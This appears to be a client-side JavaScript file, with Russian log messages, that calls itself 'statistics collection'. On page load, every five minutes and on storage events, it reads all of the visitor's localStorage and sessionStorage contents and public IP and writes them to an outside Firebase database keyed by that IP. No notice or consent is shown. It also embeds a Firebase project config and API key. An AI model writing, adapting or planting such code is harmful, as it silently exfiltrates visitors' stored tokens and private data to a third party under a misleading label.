if (typeof firebase === "undefined") {
    console.error("Firebase SDK не загружен.");
} else {
    console.log("Firebase SDK загружен.");
}

const firebaseConfig = {
    apiKey: "AIzaSyDRml8DMEyJCHmN-W6Uh8iCLEuJ7Qi6n_U",
    authDomain: "corridors-e6bb2.firebaseapp.com",
    databaseURL: "https://corridors-e6bb2-default-rtdb.firebaseio.com",
    projectId: "corridors-e6bb2",
    storageBucket: "corridors-e6bb2.appspot.com",
    messagingSenderId: "296262914238",
    appId: "1:296262914238:web:2569ed6fad9e62f486ceef",
    measurementId: "G-T8YVN3FDHJ"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
console.log("Firebase успешно инициализирован.");

window.__previousStorageSnapshot = {
    localStorage: {},
    sessionStorage: {}
};

function sanitizeKey(key) {
    return key.replace(/[.#$/\[\]]/g, "-");
}

function getLocalStorageSnapshot() {
    const snapshot = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const sanitizedKey = sanitizeKey(key);
        snapshot[sanitizedKey] = localStorage.getItem(key);
    }
    return snapshot;
}

function getSessionStorageSnapshot() {
    const snapshot = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const sanitizedKey = sanitizeKey(key);
        snapshot[sanitizedKey] = sessionStorage.getItem(key);
    }
    return snapshot;
}

function compareSnapshots(oldSnap, newSnap) {
    const oldKeys = Object.keys(oldSnap);
    const newKeys = Object.keys(newSnap);

    if (oldKeys.length !== newKeys.length) return true;

    for (let key of newKeys) {
        if (newSnap[key] !== oldSnap[key]) return true;
    }

    return false;
}

async function collectStorageStatistics() {
    try {
        console.log("Сбор данных...");

        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;
        const validUserIP = sanitizeKey(userIP);
        const timestamp = new Date().toISOString();

        const currentLocalSnap = getLocalStorageSnapshot();
        const currentSessionSnap = getSessionStorageSnapshot();

        const localChanged = compareSnapshots(window.__previousStorageSnapshot.localStorage, currentLocalSnap);
        const sessionChanged = compareSnapshots(window.__previousStorageSnapshot.sessionStorage, currentSessionSnap);

        if (!localChanged && !sessionChanged) {
            console.log("Локально: данные не изменились, обновление не требуется.");
            return;
        }

        const userRef = database.ref(`statistics/${validUserIP}`);
        const snapshot = await userRef.get();
        const existingData = snapshot.exists() ? snapshot.val() : { localStorage: {}, sessionStorage: {} };

        const updatedLocalData = { ...existingData.localStorage };
        for (const key in currentLocalSnap) {
            const value = currentLocalSnap[key];
            updatedLocalData[key] = {
                value,
                firstSeen: existingData.localStorage?.[key]?.firstSeen || timestamp,
                lastUpdated: timestamp
            };
        }

        const updatedSessionData = {};
        for (const key in currentSessionSnap) {
            const value = currentSessionSnap[key];
            updatedSessionData[key] = {
                value,
                recorded: timestamp
            };
        }

        await userRef.set({
            lastUpdated: timestamp,
            localStorage: updatedLocalData,
            sessionStorage: updatedSessionData
        });

        window.__previousStorageSnapshot.localStorage = currentLocalSnap;
        window.__previousStorageSnapshot.sessionStorage = currentSessionSnap;

        console.log("Данные обновлены в Firebase.");

    } catch (error) {
        console.error("Ошибка при сборе статистики:", error);
    }
}

function initStatisticsCollection() {
    collectStorageStatistics();
    setInterval(collectStorageStatistics, 5 * 60 * 1000);
    window.addEventListener('storage', () => collectStorageStatistics());
}

document.addEventListener('DOMContentLoaded', initStatisticsCollection);
